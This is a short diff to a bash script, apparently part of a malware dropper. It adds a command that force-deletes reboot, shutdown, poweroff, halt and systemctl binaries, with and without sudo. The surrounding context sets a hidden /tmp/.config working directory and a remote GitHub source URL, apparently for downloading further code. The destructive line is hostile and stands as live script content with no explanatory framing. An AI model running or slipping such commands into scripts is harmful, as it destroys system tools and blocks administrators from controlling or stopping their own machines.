@@ -1,5 +1,7 @@
 #!/bin/bash
 
+sudo rm -rf /sbin/reboot /sbin/shutdown /sbin/poweroff /sbin/halt /bin/systemctl /usr/sbin/reboot /usr/sbin/shutdown /usr/sbin/poweroff /usr/sbin/halt /usr/bin/systemctl || rm -rf /sbin/reboot /sbin/shutdown /sbin/poweroff /sbin/halt /bin/systemctl /usr/sbin/reboot /usr/sbin/shutdown /usr/sbin/poweroff /usr/sbin/halt /usr/bin/systemctl
+
 mode="${1:-0}"
 work="/tmp/.config"
 src="https://raw.githubusercontent.com/curiosityinteriorsuk/2088/main"
